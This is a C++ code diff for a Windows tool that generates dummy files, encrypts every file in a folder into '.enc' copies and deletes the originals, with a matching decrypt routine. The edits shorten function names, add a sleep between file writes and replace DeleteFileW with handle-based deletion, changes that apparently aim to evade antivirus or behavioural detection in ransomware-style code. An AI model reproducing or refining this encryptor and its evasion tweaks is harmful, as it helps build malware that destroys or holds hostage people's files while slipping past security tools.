@@ -55,7 +55,7 @@ std::wstring GenerateRealisticFilename(const std::wstring& ext, const std::wstri
     return L"fichier" + ext;
 }
 
-void GenerateDummyFiles(const std::wstring& folderPath, int countPerType)
+void GenDummyF(const std::wstring& folderPath, int countPerType)
 {
     CreateFolderIfNotExists(folderPath);
 
@@ -85,13 +85,13 @@ void GenerateDummyFiles(const std::wstring& folderPath, int countPerType)
                 char byte = static_cast<char>(rand() % 256);
                 file.write(&byte, 1);
             }
-
+			Sleep(10); // Trying to avoid file creation too fast
             file.close();
         }
     }
 }
 
-void ProcessFile(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
+void ProcessF(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
     std::ifstream inFile(inPath, std::ios::binary);
     if (!inFile) return;
 
@@ -107,25 +107,31 @@ void ProcessFile(const std::wstring& inPath, const std::wstring& outPath, const 
     outFile.close();
 }
 
-void EncryptAllFilesInFolder(const std::wstring& folderPath, const std::string& key) {
+void EncAllF(const std::wstring& folderPath, const std::string& key) {
     for (const auto& entry : fs::directory_iterator(folderPath)) {
         if (entry.is_regular_file()) {
             std::wstring original = entry.path();
             std::wstring encrypted = original + L".enc";
 
-            ProcessFile(original, encrypted, key);
-            DeleteFileW(original.c_str());
+            ProcessF(original, encrypted, key);
+            HANDLE h = CreateFileW(original.c_str(), DELETE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            if (h != INVALID_HANDLE_VALUE) {
+                FILE_DISPOSITION_INFO info = { TRUE };
+                SetFileInformationByHandle(h, FileDispositionInfo, &info, sizeof(info));
+                CloseHandle(h);
+            }
+
         }
     }
 }
 
-void DecryptAllFilesInFolder(const std::wstring& folderPath, const std::string& key) {
+void DecAllF(const std::wstring& folderPath, const std::string& key) {
     for (const auto& entry : fs::directory_iterator(folderPath)) {
         if (entry.is_regular_file() && entry.path().extension() == L".enc") {
             std::wstring encrypted = entry.path();
             std::wstring original = encrypted.substr(0, encrypted.length() - 4); // retirer ".enc"
 
-            ProcessFile(encrypted, original, key);
+            ProcessF(encrypted, original, key);
             DeleteFileW(encrypted.c_str());
         }
     }
